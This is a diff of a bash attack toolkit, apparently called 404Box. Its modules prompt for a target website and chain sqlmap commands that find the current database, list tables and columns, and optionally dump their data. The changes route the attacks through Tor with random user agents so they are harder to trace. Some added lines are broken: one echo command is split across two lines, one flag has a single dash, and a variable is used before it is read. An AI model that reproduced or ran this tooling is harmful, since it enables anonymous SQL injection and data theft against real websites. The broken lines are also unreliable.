@@ -13,32 +13,11 @@ read -p "Do you need to use it on termux or pc [T/p]:> " os
 
 if [ $os == "T" ] || [ $os == "t" ] || [ $os == "termux" ] || [ $os == "Termux" ] || [ $os == "TERMUX" ]; then
 
-if [ -d "~/404Box/output" ]; then
-
 main_module_t
-
-else
-
-mkdir output && main_module_t
-
-fi
 
 elif [ $os == "PC" ] || [ $os == "pc" ] || [ $os == "Pc" ] || [ $os == "p" ] || [ $os == "P" ]; then
 
-
-if [ -d "~/404Box/output" ]; then
-
 main_module
-
-else
-
-mkdir output && main_module
-
-fi
-
-else
-
-exit
 
 fi
 
@@ -1433,18 +1412,28 @@ echo -e "Github: ${cyan}https://github.com/RetroSec/"
 echo -e $red"Youtube : ${yt}\n$cyan"
 
 read -p "Target Website:> " site
-sqlmap -u $site --current-db --batch --output-dir /root/404Box/output/ | grep "current database"
+clear && toilet -F border DATABASE | lolcat && echo -e $cyan && sqlmap -u $site --current-db --batch --output-dir=/root/404Box/output/ --tor --random-agent | grep "current database: '"
+
 echo -e $yellow
 read -p "Tables:> " table
-sqlmap -u $site --batch -D $table --tables | grep "retrieved: '"
+clear && toilet -F border TABLES | lolcat && echo -e $cyan && sqlmap -u $site --batch -D $table --tables --random-agent --tor | grep "resumed: '"
+
 echo -e $green
 read -p "Columns:> " columns
-sqlmap -u $site --batch -D $table -T $columns --columns
-echo -e $green
-read -p "Columns:> " columns
-sqlmap -u $site --batch -D $table -T $columns --dump
+clear && toilet -F border COLUMNS | lolcat && echo -e $cyan && sqlmap -u $site --batch -D $table -T $columns --columns -output-dir=/root/404Box/output/ --tor --random-agent | grep "resumed: '"
+
+echo -e $cyan
+read -p "Do you need to dump data? [Y/n]:> " dump
+
+if [ $dump == "Y" ] || [ $dump == "y" ]; then
+
+clear && toilet -F border DUMP | lolcat && echo -e $cyan && sqlmap -u $site --batch -D $table -T $columns --dump --output-dir=/root/404Box/output/ --tor --random-agent | grep "retrieved: '" && echo && back_module
+
+else
 
 back_module
+
+fi
 
 }
 
@@ -1456,18 +1445,26 @@ echo -e "Github: ${cyan}https://github.com/RetroSec/"
 echo -e $red"Youtube : ${yt}\n$cyan"
 
 read -p "Target Website:> " site
-sqlmap -u $site --current-db --batch --output-dir /root/404Box/output/ | grep "current database"
+clear && toilet -F border DATABASE && echo -e $cyan && sqlmap -u $site --current-db --batch --output-dir=/root/404Box/output/ --tor --random-agent | grep "current database: "
+
 echo -e $yellow
 read -p "Tables:> " table
-sqlmap -u $site --batch -D $table --tables | grep "retrieved: '"
+clear && toilet -F border TABLES && echo -e $cyan && sqlmap -u $site --batch -D $table --tables --output-dir=/root/404Box/output/ --tor --random-agent | grep "resumed: '"
+
 echo -e $green
 read -p "Columns:> " columns
-sqlmap -u $site --batch -D $table -T $columns --columns
-echo -e $green
-read -p "Columns:> " columns
-sqlmap -u $site --batch -D $table -T $columns --dump
+clear && toilet -F border COLUMNS && echo -e $cyan && sqlmap -u $site --batch -D $table -T $columns --columns --output-dir=/root/404Box/output/ --tor --random-agent | grep "resumed: '"
+e
+cho -e $cyan
+if [ $dump == "Y" ] || [ $dump == "y" ]; then
+
+clear && toilet -F border DUMP && echo -e $cyan && sqlmap -u $site --batch -D $table -T $columns --dump --output-dir=/root/404Box/output/ --tor --random-agent | grep "retrieved: '" && echo && back_module
+
+else
 
 back_module
+
+fi
 
 }
 
